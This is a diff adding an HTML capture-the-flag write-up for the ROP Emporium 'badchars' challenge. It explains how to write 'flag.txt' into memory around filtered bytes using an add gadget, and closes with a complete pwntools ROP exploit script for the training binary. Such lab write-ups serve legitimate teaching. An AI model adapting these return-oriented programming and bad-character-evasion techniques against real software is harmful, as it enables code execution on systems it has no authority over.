@@ -1,14 +1,110 @@
 <div class="page-header">
     <div class="page-header-inner">
         <div class="page-header-inner2">
-            <h1>Rop-Emporium - Badchars</h1>
+            <h1>Badchars Writeup</h1>
+            <h2>May 2021</h2>           
+            <h4>Win Function with Correct Parameters while dealing with bad chars</h4>
         </div>
     </div>
 </div>
+<H4>Problem</H4>
 <div class="paragraph">
-    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Distinctio excepturi asperiores voluptate quisquam! Temporibus minus esse obcaecati recusandae exercitationem quam adipisci laboriosam veniam, est molestiae reiciendis at, nobis autem soluta?</p>
+    <p>
+        Learn to deal with badchars, characters that will not make it into process memory intact or cause other issues such as premature chain termination.</a> <a href=../../docs/rop_emporium/badchars>badchars</a>
+    	<br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally.
+        <br>
+		Once again we have a win function that prints out the contents of a given file that we pass it as an argument. The exploitation process for this challenge is 
+		basically the exact same as for write4, just with one main difference. We now need to deal with 4 bad chars: 'x', 'g', 'a', '.'.
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/rop_emporium/badchars1.png" alt="">
 </div>
 <div class="paragraph">
-    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Laudantium inventore vel ut, a eum harum. Aliquam est hic maxime, temporibus neque minima optio, quia alias sequi non dolores distinctio dolore?</p>
+    <p>
+		<br><br>
+		Looking at the binary, we find a function called 'usefulGadgets'. Looking at the available Gadgets in this function, I got 3 different ideas to write the 'flag.txt' 
+		string into memory. <br>
+		The first option includes the 'add    BYTE PTR [r15],r14b' gadget, I can write the string 'fl`f-twt' into memory, and add 1 to the characters ''' 'f' '-' & 'w' to produce the correct 
+		string "flag.txt". Lastly using the "xor    BYTE PTR [r15],r14b" gadget, we could xor the bad characters of the "flag.txt" string with a value of our choice, and then
+		undo the xor using this gadget to produce the correct flag in memory. <br>
+		I decided to use the first option, however the other 2 would have been just as simple. 
+    	<br><br>
+    </p>
 </div>
+<div>
+    <img src="../imgs/rop_emporium/badchars2.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+		<br><br>
+		Similarly to the previous write4 challenge, we need to first write the string "flag.txt" into memory. Due to the bad characters, in our case we'll write in "fl`f-twt". To accomplish this
+		we'll use a very similar set of gadgets as in the previous challenge. Once that is completed we will call the add gadget 4 times to increment the 4 individual bad character bytes of our string
+		by 0x1. 
+		<br>
+		Finally we can call the print_file function to print the flag. The complete exploit is posted below.
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/rop_emporium/badchars3.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+
+from pwn import *
+elf = context.binary = ELF('./badchars')
+libc = elf.libc
+p = elf.process()
+
+string = b"fl`f-twt"
+
+bss_loc1 = p64(0x601038)
+bss_loc2 = p64(0x601038+12)
+
+pop_rdi = p64(0x4006a3)
+pop_rsi_r15 = p64(0x4006a1)
+pop_r12_r13 = p64(0x40069c)
+mov_r12_to_r13 = p64(0x400634)
+add_r15_r14 = p64(0x40062c)
+pop_r15 = p64(0x4006a2)
+ret = p64(0x4004ee)
+t = b"T"*8
+
+loc1 = p64(0x601038 + 2)
+loc2 = p64(0x601038 + 3)
+loc3 = p64(0x601038 + 4)
+loc4 = p64(0x601038 + 6) #Locations of bad chars in memory
+
+payload = b"A"*40 
+payload += pop_r12_r13 + string + bss_loc1 + t + t + mov_r12_to_r13                     #Write string into memory
+payload += pop_r12_r13 + t + t + p64(0x1) + loc1                                        #Set r14 to 0x1 and r15 to the first bad char location
+payload += add_r15_r14 + pop_r15 + loc2 + add_r15_r14 + pop_r15 + loc3 + add_r15_r14 + pop_r15 + loc4 + add_r15_r14   #perform the add loc, 0x1 operations to create "flag.txt"
+payload += pop_rdi + bss_loc1 + ret + p64(elf.sym.print_file)                           #Call print_file()
+
+p.sendline(payload)
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
